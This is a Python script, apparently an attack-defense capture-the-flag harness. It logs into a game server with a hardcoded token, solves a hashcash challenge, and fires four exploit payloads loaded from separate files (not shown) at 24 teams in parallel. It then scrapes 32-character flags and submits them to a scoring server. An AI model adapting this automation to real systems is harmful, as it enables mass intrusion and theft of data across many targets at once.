import requests
import threading
import os
import time
import subprocess

threads = []


base = os.path.dirname(__file__)
payloads = [
    open(base + "/exp1.py", "r").read(),
    open(base + "/exp2.py", "r").read(),
    open(base + "/exp3.py", "r").read(),
    open(base + "/exp4.py", "r").read(),
]
fails = []
not_work = []
lock = threading.Lock()
lock2 = threading.Lock()

host = "http://10.11.0.1:5000"


def job(i):
    global fails
    r = requests.Session()
    wt = 10
    print(f"atttack {i}")
    isfail = True
    for j in range(len(payloads)):
        payload = payloads[j]

        res = ""
        while 1:
            try:
                res = r.post(
                    f"{host}/login", data={"token": "0de1d21a247448a5a8be25e812abb4e7"}
                )
                print("Logined")
                res = r.get(f"{host}/panel")
                PoW = res.text[
                    res.text.find("hashcash") : res.text.find("hashcash") + 47
                ]
                stamp = subprocess.check_output(PoW.split(" ")).decode()[:-1]
                res = r.post(
                    f"{host}/api/attack/{i}",
                    json={"code": payload, "stamp": stamp},
                    timeout=wt,
                )
                break
            except:
                print(f"retry {i}")
                wt += 5
                pass
        flag = ""
        if res.text.find("FOE") != -1:
            text = res.text[::-1]
            flag = text[text.find("EOF") : text.find("EOF") + 32]
        else:
            flag = res.text[res.text.find("EOF") : res.text.find("EOF") + 32]
        if i == 10:
            if len(flag) != 32:
                print(f"Failed Team {i} paylod {j}: {res.text}")
                lock2.acquire()
                not_work.append(f"payload {j} not work for team {i}")
                lock2.release()
                continue
            else:
                isfail = False
                print(f"Exploited Team {i} by payload {j}")
                break
        res2 = ""
        while 1:
            try:
                res2 = r.post(
                    "http://10.6.0.1:8889/flag",
                    json={"flags": [flag], "token": "0de1d21a247448a5a8be25e812abb4e7"},
                    timeout=10,
                )
                break
            except:
                time.sleep(3)
                pass
        if "Wrong" in res2.text or len(flag) != 32:
            print(f"Failed Team {i} paylod {j}: {res.text}")
            lock2.acquire()
            not_work.append(f"payload {j} not work for team {i}")
            lock2.release()
        else:
            print(f"Exploited Team {i}: {res2.text}")
            isfail = False
            return
    if isfail:
        lock.acquire()
        fails.append(i)
        lock.release()
    print(f"{fails=}")


for i in range(1, 25):
    threads.append(threading.Thread(target=job, args=(i,)))
    threads[i - 1].start()


for i in range(1, 25):
    threads[i - 1].join()
print(not_work)
print(f"{fails=}")
print("DOne")
if len(fails) == 0:
    time.sleep(30)
